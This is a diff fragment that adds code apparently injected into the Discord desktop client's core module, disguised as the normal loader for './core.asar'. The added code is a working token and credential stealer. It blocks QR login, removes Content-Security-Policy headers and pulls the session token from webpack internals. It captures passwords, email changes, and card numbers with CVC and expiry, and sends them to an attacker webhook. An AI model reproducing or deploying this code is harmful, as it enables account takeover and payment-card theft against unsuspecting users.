+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
+  hooker(content);
+};
+session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
+  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
+  updateCheck();
+});
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+  if (details.url.startsWith(config.webhook)) {
+    if (details.url.includes('discord.com')) {
+      callback({
+        responseHeaders: Object.assign(
+          {
+            'Access-Control-Allow-Headers': '*',
+          },
+          details.responseHeaders,
+        ),
+      });
+    } else {
+      callback({
+        responseHeaders: Object.assign(
+          {
+            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+            'Access-Control-Allow-Headers': '*',
+            'Access-Control-Allow-Origin': '*',
+          },
+          details.responseHeaders,
+        ),
+      });
+    }
+  } else {
+    delete details.responseHeaders['content-security-policy'];
+    delete details.responseHeaders['content-security-policy-report-only'];
+
+    callback({
+      responseHeaders: {
+        ...details.responseHeaders,
+        'Access-Control-Allow-Headers': '*',
+      },
+    });
+  }
+});
+
+session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+  if (details.statusCode !== 200 && details.statusCode !== 202) return;
+  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+  const data = JSON.parse(unparsed_data);
+  const token = await execScript(
+    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+  );
+  switch (true) {
+    case details.url.endsWith('login'):
+      login(data.login, data.password, token).catch(console.error);
+      break;
+
+    case details.url.endsWith('users/@me') && details.method === 'PATCH':
+      if (!data.password) return;
+      if (data.email) {
+        emailChanged(data.email, data.password, token).catch(console.error);
+      }
+      if (data.new_password) {
+        passwordChanged(data.password, data.new_password, token).catch(console.error);
+      }
+      break;
+
+    case details.url.endsWith('tokens') && details.method === 'POST':
+      const item = querystring.parse(unparsedData.toString());
+      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
+      break;
+
+    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+      PaypalAdded(token).catch(console.error);
+      break;
+
+    case details.url.endsWith('confirm') && details.method === 'POST':
+      if (!config.auto_buy_nitro) return;
+      setTimeout(() => {
+        nitroBought(token).catch(console.error);
+      }, 7500);
+      break;
+
+    default:
+      break;
+  }
+});
+module.exports = require('./core.asar');
